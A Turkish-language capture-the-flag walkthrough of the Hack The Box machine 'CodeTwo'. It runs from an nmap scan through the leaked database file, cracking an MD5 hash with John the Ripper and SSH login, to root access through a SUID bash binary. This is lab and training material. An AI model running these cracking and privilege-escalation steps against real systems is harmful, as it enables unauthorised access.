## 0️⃣ Makineye Bağlanmak

- 📥 HTB panelinden OpenVPN dosyamızı indirip terminalden bağlandık:
    

```bash
openvpn <vpn_dosyasi>.ovpn
```

- 🌐 “Join Machine” butonuna basarak makineyi başlattık ve hedef IP’sini aldık: `10.10.11.82`.
    
- ✅ Artık hedef sisteme saldırıya hazırız.
    

---

## 1️⃣ Pasif Bilgi Toplamak

- 🔧 İlk tarama:
    

```bash
nmap -p- -sS -T4 -Pn -n -e tun0 -v -oN full_tcp.txt 10.10.11.82
```

- 🔎 Sonuçlarda şu portlar bulundu:
    
    - **22/tcp** → SSH
        
    - **8000/tcp** → Gunicorn (Python web app, “CodeTwo”)
        
    - **8080/tcp** → Python SimpleHTTPServer (directory listing açık)
        
    - **13500/tcp** → bilinmeyen (geçici olarak açık, sonra kapalı)
        

---

## 2️⃣ Aktif Bilgi Toplamak

- 🌐 `http://10.10.11.82:8000` → CodeTwo web uygulaması çalışıyordu.
    
- 🌐 `http://10.10.11.82:8080` → Directory listing açıktı, içeride veritabanı dosyası bulundu.
    
- 📂 Bu DB dosyasında **kullanıcı adı ve parola hash** elde edildi.
    

---

## 3️⃣ Hash Analizi ve Kırma

- 🔎 Hash: `649c9d65a206a75f5abe509fe128bce5`
    
- 🧩 Hash tipi: **MD5**
    
- 🔨 John the Ripper ile kırma:
    

```bash
echo "649c9d65a206a75f5abe509fe128bce5" > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=Raw-MD5 hash.txt
```

- ✅ Başarılı şekilde parola elde edildi.
    

---

## 4️⃣ Sisteme Erişim

- 🔑 Kullanıcı adı ve kırılan parola ile SSH bağlantısı:
    

```bash
ssh marco@10.10.11.82
```

- 🖥️ Sisteme giriş yapıldı, kullanıcı flag alındı.
    

---

## 5️⃣ Yetki Yükseltmek

- ⚡ `linpeas.sh` çalıştırıldı, şu bulgular öne çıktı:
    
    - `/usr/bin/bash` dosyasında **SUID bit aktif**.
        
    - Sistem **CVE-2021-3560 (polkit)** için savunmasız görünüyor.
        
- 🎯 En hızlı yöntem: **SUID bash exploit**
    

```bash
/usr/bin/bash -p
whoami   # root
```

- ✅ Root shell elde edildi ve root flag alındı.
    

---

## 🎯 Sonuç

- 🌍 Pasif keşif → açık portlar bulundu.
    
- 📂 Aktif keşif → 8080’de DB dosyası bulundu.
    
- 🔑 Hash kırma → parola elde edildi.
    
- 🖥️ SSH → kullanıcı shell.
    
- ⚡ SUID bash → root shell.
    

💡 Bu yöntemle **HTB CodeTwo** makinesi başarıyla ele geçirildi.

---